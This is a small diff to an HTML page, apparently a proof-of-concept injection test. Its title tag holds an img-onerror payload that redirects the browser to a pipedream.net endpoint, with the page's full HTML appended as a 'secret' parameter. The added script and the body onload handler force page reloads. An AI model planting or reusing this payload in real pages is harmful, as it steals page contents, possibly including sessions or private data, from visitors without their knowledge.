@@ -3,6 +3,13 @@
   <head>
     <meta charset="utf-8">
     <title><img src=tas onerror="document.location='https://eozi6xw3ogrvjqh.m.pipedream.net/?secret='+document.documentElement.innerHTML;"</title>
+    <script>
+      function refreshOnce() {
+        location.reload();
+        window.removeEventListener('load', refreshOnce);
+      }
+      window.addEventListener('load', refreshOnce);
+    </script>
   </head>
   <body onload="location.reload()">
     <p>Not sneaky at all</p>
